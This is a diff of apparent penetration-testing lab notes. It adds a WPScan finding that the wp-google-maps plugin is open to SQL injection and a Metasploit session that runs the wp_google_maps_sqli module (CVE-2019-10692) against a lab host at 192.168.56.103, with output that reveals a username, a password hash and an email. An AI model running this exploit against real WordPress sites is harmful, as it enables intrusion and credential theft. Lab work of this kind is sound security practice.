@@ -110,12 +110,23 @@ Exploit 3: WORDPRESS ENUMERATION VIA WPSCAN
 kali$ wpscan --url http://10.0.2.5
 -> wordpress version 5.2.3 (insecure, outdated)
 -> theme twentyseventeen (outdated)
--> wp-google-maps plugin found 
+-> wp-google-maps plugin found => VULN TO SQLi
 -> wp-cron.php endpoint found
 -> readme.html found (reveals version)
 -> phpinfo.php (info disclosure)
 -> /uploads/ directory indexing enabled
 
+//IPs changed; Kali: 192.168.56.101, Meta: 192.168.56.102, HF: 192.168.56.103
 
 Exploit 4: WORDPRESS PLUGIN SQL INJECTION - WP-GOOGLE-MAPS (CVE-2019-10692)
+kali$ msfconsole -q
+msf > search wp_google_maps_sqli
+msf > use 0
+msf auxillary(admin/http/wp_google_maps_sqli) > set RHOSTS 192.168.56.103
+msf auxillary(admin/http/wp_google_maps_sqli) > exploit
+-> username: webmaster
+-> hash value found
+-> email found
+-> credentials storage location found
+
 
